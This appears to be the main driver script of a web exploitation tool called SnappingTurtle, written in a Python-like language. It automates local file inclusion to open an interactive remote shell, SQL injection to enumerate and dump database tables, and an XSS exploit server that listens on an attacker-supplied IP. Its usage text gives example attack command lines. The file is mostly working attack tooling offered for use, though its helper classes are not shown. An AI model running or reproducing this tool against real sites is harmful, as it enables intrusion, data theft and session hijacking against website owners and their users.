import('json');

class ShellCommand {
    Quit: 'quit',
};

shellLoop = @(shell) {
    while (true) {
        cmd = raw_input('st>');
        
        switch (cmd) {
            ShellCommand.Quit: {
                print('Exiting');
                quit();
            }
            default: cmd |> shell.run |> print;
        }
    }
};

listTables = @(tmpl) {
    probe = SqlUnionProbe(tmpl);
    di = probe.listSchemas();
    
    if (di == null)
    {
        print('[X] List tables failed\r\n');
        
        ret null;
    }
    
    keys = di.keys();
    print('[+] %s databases found\r\n' % (keys |> len));
    for (key in keys) {
        print('    ' + key);
        for (table in di[key])
            print('      ' + table);
        print('');
    }
};

printTable = @(columns, rows) {
    rows = [columns] + [columns @select(@(x) '')] + rows;
    
    colLens = range(0, len(columns))
        @select(@(x) rows @select(@(y) y[x] |> len))
        @select(@(x) sorted(x, reverse = true)[0] + 1);

    for (row in rows) {
        i = 0;
        for (col in row) {
            maxLen = colLens[i];
            pad = maxLen - len(col);
            sys.stdout.write(col + (' ' * (pad + 1)));
            i++;
        }
        sys.stdout.write('\r\n');
    }
    sys.stdout.write('\r\n');
};

print('SnappingTurtle Web Exploitation Tool 0.1.' + __BUILD__);
print('http://autosectools.com/SnappingTurtle\r\n');

if (hasArgs) {
    shell = null;
    tmpl = HttpRequestTemplate(args.Url, args.Get, args.Post);
    
    switch (args.Mode) {
        ClassOption.Lfi: {
            print('[i] Exploiting local file inclusion');            
            shell = LfiShell(tmpl);
            
            if (!shell.create()) {
                print('[X] Failed to create shell, exiting\r\n');
                quit();
            }
        }
        
        ClassOption.Sqli: {
            print('[i] Exploiting SQL injection');
            
            switch (args.ModeOption) {
                SqliOption.List: {
                    print('[?] Listing databases and tables');
                    listTables(tmpl);
                }
                
                SqliOption.Table: {
                    p = args.ModeOption2.split('.');
                    schema = p[0];
                    table = p[1];
                    print("[?] Dumping table '{}' of database '{}'".format(table, schema));
                    probe = SqlUnionProbe(tmpl);
                    columns = probe.listColumns(schema, table);                    
                    
                    if (columns == null) {
                        print('[X] Could not enumerate columns\r\n');
                        quit();
                    }
                    
                    rows = probe.dumpTable(table, columns = columns);
                    
                    if (rows != null) {
                        print('\r\n[+] Table dumped:\r\n');
                        printTable(columns, rows);
                    } else {
                        print('[X] Could not dump table\r\n');
                        quit();
                    }                    
                }
                    
                default: {
                    print('[X] Invalid SQL injection option\r\n');
                    quit();
                }
            }
            
            quit();
        }
        
        ClassOption.Xss: {
            print('[i] Starting XSS server\r\n');
            ip = args.ModeOption;
            server = ExploitServer(ip);
            xss = server.createExploit(tmpl);
            print('[+] XSS URL:\r\n\r\n    %s\r\n' % xss);
            server.serveForever();
        }
        
        default: {
            print('[X] Invalid strategy: %s\r\n' % args.Mode);
            quit();
        }
    }

    shellLoop(shell);
} else {    
    print('python st.py [exploitation strategy] [url] [inputs]\r\n');
    print('# Exploitation Strategies\r\n');
    print('  lfi                Local file inclusion. Injection is performed using the $lfi token.');
    print('');
    print('  sqli {options}     SQL injection. Injection is performed using the $sqli token.');
    print('');
    print('    If used, one of two options must be specified:');
    print('');
    print('    list             Dumps a list of databases and tables.');    
    print('    table {name}     Dumps a database table.');
    print('');
    print('  xss {server ip}    Cross-site scripting. Injection is performed using the $xss token.');
    print('');
    print('    If used, a target accessible server IP must be specified for listening.');
    print('');
    print('# Url\r\n');
    print('  The url to exploit. Can be injected into using tokens.\r\n');
    print('# Inputs\r\n');
    print('  --g {GET name} {GET value}     GET data in key/value format.');
    print('  --p {POST name} {POST value}   POST data in key/value format.');
    print('  -g {GET data}                  GET data in Python map format.');
    print('  -p {POST data}                 POST data in Python map format.');
    print('');
    print('# Examples\r\n');
    print('  python st.py lfi http://localhost/lfiTest.php?theme=$lfi\r\n');
    print('  python st.py lfi http://localhost/lfiTest.php --g theme $lfi\r\n');
    print('  python st.py lfi http://localhost/lfiTest.php?theme=$lfi%00\r\n');
    print('  python st.py lfi http://localhost/postTest.php -p "{\'theme\':\'$lfi\'}"\r\n');
    print('  python st.py sqli list http://localhost/sqliTest.php --g email $sqli\r\n');
    print('  python st.py sqli table sqlitest.users http://localhost/sqliTest.php --g email $sqli\r\n');
    print('  python st.py xss 10.0.0.122 http://10.0.0.145/xss.php --g search $xss\r\n');
    
    
}
